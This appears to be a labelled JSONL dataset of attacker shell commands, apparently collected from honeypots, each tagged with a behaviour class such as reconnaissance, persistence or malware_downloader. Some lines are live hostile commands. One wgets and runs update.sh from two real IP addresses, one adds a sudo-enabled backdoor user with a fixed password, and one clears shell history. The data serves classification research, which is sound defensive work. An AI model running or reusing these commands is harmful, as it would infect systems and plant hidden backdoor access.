+{"command": "cat /proc/self", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "startResult=$(echo \"[\"\"[\"\"[\");", "label": "reconnaissance", "count": 2, "sample": "novel_skeleton", "period": "2021_2022"}
+{"command": "uname -m&&pkill upnpsetup", "label": "defense_evasion", "count": 3, "sample": "novel_skeleton", "period": "2024"}
+{"command": "touch mwyjm", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "echo 1 && cat /bin/echo", "label": "reconnaissance", "count": 66, "sample": "novel_skeleton", "period": "2024"}
+{"command": "nvidia-smi --list-gpus | grep 0 | cut -f2 -d:", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "Connection: keep-alive", "label": "benign", "count": 1, "sample": "novel_skeleton", "period": "2021_2022"}
+{"command": "dd bs=1 count=1911588 > /tmp/cBOVQTCVl8", "label": "malware_downloader", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "history -c", "label": "defense_evasion", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 kqymhM7C) system && sudo usermod -aG sudo system", "label": "persistence", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "touch uhynz", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "cd /tmp; wget http://185.10.68.196/update.sh; busybox wget http://139.59.88.74/update.sh; chmod 777 update.sh; sh update.sh; rm -f update.sh", "label": "malware_downloader", "count": 1, "sample": "novel_skeleton", "period": "2024"}
